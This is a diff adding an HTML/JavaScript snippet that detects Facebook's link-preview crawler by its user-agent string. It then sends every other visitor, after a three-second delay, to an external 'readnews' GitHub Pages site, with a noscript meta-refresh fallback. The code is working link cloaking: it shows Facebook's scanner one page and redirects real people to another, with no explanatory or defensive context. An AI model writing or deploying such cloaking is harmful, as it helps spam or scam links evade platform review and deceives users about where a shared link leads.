@@ -1,0 +1,27 @@
+<script>
+
+  function isFacebookBot() {
+
+    var ua = navigator.userAgent || "";
+
+    return ua.includes("facebookexternalhit") || ua.includes("Facebot");
+
+  }
+
+  if (!isFacebookBot()) {
+
+    setTimeout(function() {
+
+      window.location.href = "https://chdprabin.github.io/readnews/";
+
+    }, 3000); // 3-second delay
+
+  }
+
+</script>
+
+<noscript>
+
+  <meta http-equiv="refresh" content="3;url=https://chdprabin.github.io/readnews/" />
+
+</noscript>
